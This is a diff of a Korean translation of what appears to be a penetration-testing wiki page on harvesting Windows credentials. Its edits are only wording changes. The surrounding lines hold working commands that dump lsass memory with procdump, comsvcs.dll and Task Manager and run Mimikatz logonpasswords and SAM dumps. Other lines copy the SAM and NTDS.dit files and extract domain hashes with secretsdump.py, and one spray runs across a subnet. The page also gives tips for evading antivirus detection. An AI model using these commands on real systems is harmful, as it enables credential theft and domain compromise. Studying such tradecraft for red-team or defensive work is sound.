@@ -28,7 +28,7 @@ Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpa
 
 ## Meterpreter를 이용한 자격 증명
 
-내가 만든 [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials)을 사용하여 **희생자 내부에서 비밀번호와 해시를 검색하세요.**
+내가 만든 [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials)을 사용하여 **희생자 내부에서 비밀번호와 해시를 검색**하세요.
 ```bash
 #Credentials from SAM
 post/windows/gather/smart_hashdump
@@ -49,8 +49,8 @@ mimikatz_command -f "lsadump::sam"
 
 ### Procdump + Mimikatz
 
-**Procdump는** [**SysInternals**](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**의 정품 Microsoft 도구**이므로 Defender에 의해 탐지되지 않습니다.\
-이 도구를 사용하여 **lsass 프로세스를 덤프하고**, **덤프를 다운로드**하며 **덤프에서 자격 증명을 로컬로 추출**할 수 있습니다.
+**SysInternals의 Procdump는** [**합법적인 Microsoft 도구**](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) **이기 때문에 Defender에 의해 탐지되지 않습니다.**\
+이 도구를 사용하여 **lsass 프로세스를 덤프하고**, **덤프를 다운로드하며**, **덤프에서 자격 증명을 로컬로 추출**할 수 있습니다.
 ```bash:Dump lsass
 #Local
 C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
@@ -67,7 +67,7 @@ mimikatz # sekurlsa::logonPasswords
 ```
 이 프로세스는 [SprayKatz](https://github.com/aas-n/spraykatz)를 사용하여 자동으로 수행됩니다: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
-**참고**: 일부 **AV**는 **procdump.exe를 사용하여 lsass.exe를 덤프하는 것**을 **악성**으로 **탐지**할 수 있습니다. 이는 **"procdump.exe"와 "lsass.exe"** 문자열을 **탐지**하기 때문입니다. 따라서 **lsass.exe의 이름 대신** procdump에 **lsass.exe의 PID를 인수로 전달하는 것이 더 은밀합니다.**
+**참고**: 일부 **AV**는 **procdump.exe를 사용하여 lsass.exe를 덤프하는 것**을 **악성**으로 **탐지**할 수 있습니다. 이는 **"procdump.exe"와 "lsass.exe"** 문자열을 **탐지**하기 때문입니다. 따라서 **lsass.exe의 PID**를 procdump에 **인수로 전달하는 것이** **lsass.exe 이름**을 사용하는 것보다 **은밀합니다.**
 
 ### **comsvcs.dll**로 lsass 덤프하기
 
@@ -80,14 +80,14 @@ mimikatz # sekurlsa::logonPasswords
 ```bash
 rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
 ```
-**이 프로세스는** [**lssasy**](https://github.com/Hackndo/lsassy)**로 자동화할 수 있습니다.**
+**이 프로세스를** [**lssasy**](https://github.com/Hackndo/lsassy)**로 자동화할 수 있습니다.**
 
 ### **작업 관리자를 사용하여 lsass 덤프하기**
 
 1. 작업 표시줄을 마우스 오른쪽 버튼으로 클릭하고 작업 관리자를 클릭합니다.
 2. 자세히 더 보기 클릭
-3. 프로세스 탭에서 "로컬 보안 권한 부여 프로세스" 프로세스를 검색합니다.
-4. "로컬 보안 권한 부여 프로세스" 프로세스를 마우스 오른쪽 버튼으로 클릭하고 "덤프 파일 만들기"를 클릭합니다.
+3. 프로세스 탭에서 "로컬 보안 권한 프로세스" 프로세스를 검색합니다.
+4. "로컬 보안 권한 프로세스" 프로세스를 마우스 오른쪽 버튼으로 클릭하고 "덤프 파일 만들기"를 클릭합니다.
 
 ### procdump를 사용하여 lsass 덤프하기
 
@@ -184,7 +184,7 @@ Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c
 ```
 ## **Active Directory 자격 증명 - NTDS.dit**
 
-**NTDS.dit** 파일은 **Active Directory**의 핵심으로, 사용자 객체, 그룹 및 그들의 멤버십에 대한 중요한 데이터를 보유하고 있습니다. 이곳은 도메인 사용자의 **비밀번호 해시**가 저장되는 곳입니다. 이 파일은 **Extensible Storage Engine (ESE)** 데이터베이스이며 **_%SystemRoom%/NTDS/ntds.dit_**에 위치합니다.
+**NTDS.dit** 파일은 **Active Directory**의 핵심으로, 사용자 객체, 그룹 및 그들의 멤버십에 대한 중요한 데이터를 보유하고 있습니다. 이곳은 도메인 사용자에 대한 **비밀번호 해시**가 저장되는 곳입니다. 이 파일은 **Extensible Storage Engine (ESE)** 데이터베이스이며 **_%SystemRoom%/NTDS/ntds.dit_**에 위치합니다.
 
 이 데이터베이스 내에는 세 가지 주요 테이블이 유지됩니다:
 
@@ -216,7 +216,7 @@ ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 
 ### **NTDS.dit에서 해시 추출하기**
 
-**NTDS.dit** 및 **SYSTEM** 파일을 **획득**한 후, _secretsdump.py_와 같은 도구를 사용하여 **해시를 추출**할 수 있습니다:
+**NTDS.dit**와 **SYSTEM** 파일을 **획득**한 후, _secretsdump.py_와 같은 도구를 사용하여 **해시를 추출**할 수 있습니다:
 ```bash
 secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
 ```
